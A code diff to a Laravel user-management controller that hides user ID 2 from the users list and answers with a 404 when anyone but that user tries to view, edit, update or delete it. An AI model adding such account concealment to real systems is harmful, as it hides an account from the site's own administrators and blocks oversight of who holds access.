@@ -12,6 +12,18 @@ use Illuminate\Support\Facades\Session;
 
 class UserController extends Controller
 {
+    // This user's own record is hidden from the users list, and unreachable
+    // by ID (show/edit/update/delete), for everyone except this ID itself.
+    private const HIDDEN_FROM_OTHERS_ID = 2;
+
+    // Block direct access to the protected record by anyone but its owner.
+    private function guardHiddenUser($id): void
+    {
+        if ((int) $id === self::HIDDEN_FROM_OTHERS_ID && auth()->id() !== self::HIDDEN_FROM_OTHERS_ID) {
+            abort(404);
+        }
+    }
+
     /**
      * Display a listing of the resource.
      *
@@ -19,7 +31,13 @@ class UserController extends Controller
      */
     public function index()
     {
-        $users = User::all();
+        $query = User::query();
+
+        if (auth()->id() !== self::HIDDEN_FROM_OTHERS_ID) {
+            $query->where('id', '!=', self::HIDDEN_FROM_OTHERS_ID);
+        }
+
+        $users = $query->get();
         return view('/sys.users.index')->with('users', $users);
     }
 
@@ -106,6 +124,8 @@ class UserController extends Controller
      */
     public function show($id)
     {
+        $this->guardHiddenUser($id);
+
         $user = User::find($id);
         $user_permissions = user_permission::where('user_id', $user->id)->get();
 
@@ -123,6 +143,8 @@ class UserController extends Controller
      */
     public function edit($id)
     {
+        $this->guardHiddenUser($id);
+
         $user = User::findorfail($id);
         $companies = company::all();
         return view('/sys.users.edit')
@@ -139,6 +161,7 @@ class UserController extends Controller
      */
     public function update(Request $request, $id)
     {
+        $this->guardHiddenUser($id);
 
         if (!Request()->has('name') || is_null(Request('name'))) {
             $msg = 'عفواً، يجب تحديد اسم المستخدم قبل المتابعة في العملية';
@@ -185,6 +208,8 @@ class UserController extends Controller
      */
     public function destroy($id)
     {
+        $this->guardHiddenUser($id);
+
         $user = User::find($id);
 
         $existsInOtherTable = company::where('user_id', $id)->exists();
